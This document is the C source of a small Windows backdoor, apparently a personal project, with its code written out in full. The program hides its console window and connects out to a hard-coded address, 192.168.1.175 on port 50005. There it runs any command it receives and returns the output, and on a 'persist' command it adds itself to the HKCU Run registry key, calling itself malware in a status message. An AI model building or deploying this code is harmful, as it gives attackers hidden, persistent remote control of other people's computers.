
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

// TODO: make program compatible with linux type OS
// TODO: check for memory leaks
// TODO: exchange strcmp with strncmp
// TODO: add en enum and a switch that check for commands
#define bzero(p, size) (void) memset((p), 0, (size)) 


int sock;

int bootRun()
{

  char *error = "Failed\n";
  char *success = "Successfully added malware to registry\n";
  TCHAR szPath[MAX_PATH]; // MAX_PATH size on Win10 -> 256
  DWORD pathLen = 0; // Double Word -> unsigned 32 bit

  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
  if (!pathLen) {
    send(sock, error, sizeof(error), 0);
    return -1;    
  }

  HKEY NewVal;

  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
    send(sock, error, sizeof(error), 0);
    return -1;
  }

  DWORD pathLenInBytes = pathLen * sizeof(*szPath); // ??
  if (RegSetValueEx(NewVal, TEXT("LeLee"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
    RegCloseKey(NewVal);
    send(sock, error, sizeof(error), 0);
    return -1;
  }

  RegCloseKey(NewVal);
  send(sock, success, sizeof(success), 0);
  return 0; 
}

void Shell()
{
  char buffer[1025];
  char container[1025];
  char total_response[18433];

  while(1) {
    bzero(buffer, 1024);
    bzero(container, 1024);
    bzero(total_response, 18432);
    recv(sock, buffer, 1024, 0);
  
    if (!strcmp("q", buffer)) {
      closesocket(sock);
      WSACleanup(); // cleaning after connection on Win
      exit(EXIT_SUCCESS);
    }
    else if (!strncmp("cd ", buffer, 3)) {
      char path[1025];
      strncat(path, buffer + 3, strlen(buffer) - 3);
      chdir(path);
    }
    else if (!strcmp("persist", buffer)) {
      bootRun();
    }
    else {
      FILE *fp = _popen(buffer, "r"); //check this out
      if (!fp) { exit(EXIT_FAILURE); }
      while (fgets(container, 1024, fp) != NULL) {
        strcat(total_response, container);
      }
      send(sock, total_response, sizeof(total_response), 0);
      fclose(fp);
    }
  }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);

  ShowWindow(stealth, 0);

  struct sockaddr_in ServAddr;
  unsigned short ServPort;
  char * ServerIp;
  WSADATA wsaData;

  ServerIp = "192.168.1.175";
  ServPort = 50005;

  if (WSAStartup(MAKEWORD(2, 0), &wsaData)) {
    return 0;
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);
  
  memset(&ServAddr, 0, sizeof(ServAddr));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServerIp);
  ServAddr.sin_port = htons(ServPort); // htons() switch from small endian to big endian

  while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) { Sleep(10); }
  Shell();
}

